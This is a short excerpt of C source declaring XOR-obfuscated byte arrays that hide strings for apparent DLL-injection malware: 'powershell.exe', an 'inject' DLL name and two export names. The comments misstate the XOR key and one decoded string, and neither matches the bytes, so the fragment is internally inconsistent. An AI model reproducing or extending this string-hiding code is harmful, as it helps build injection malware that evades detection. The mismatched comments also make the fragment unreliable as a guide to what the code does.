...
static const unsigned char xPowerShell[] = {
    0xAB, 0xB4, 0xAC, 0xBE, 0xA9, 0xA8, 0xB3, 0xBE,
    0xB7, 0xB7, 0xF5, 0xBE, 0xA3, 0xBE
};
#define xPowerShell_LEN 14

/* "cheyanne_inject.dll" XOR 0x77 */
static const unsigned char xDllName[] = {
    0xAD, 0xBA, 0xBF, 0xBE, 0xA9, 0x84, 0xB2, 0xB5,
    0xB1, 0xBE, 0xB8, 0xAF, 0xF5, 0xBF, 0xB7, 0xB7
};
#define xDllName_LEN 16

/* "VdrInit" XOR 0x77 */
static const unsigned char xInitFunc[] = {
    0x8D, 0xBF, 0xA9, 0x92, 0xB5, 0xB2, 0xAF
};
#define xInitFunc_LEN 7

/* "VdrWatch" XOR 0x77 */
static const unsigned char xWatchFunc[] = {
    0x8D, 0xBF, 0xA9, 0x8C, 0xBA, 0xAF, 0xB8, 0xB3
};
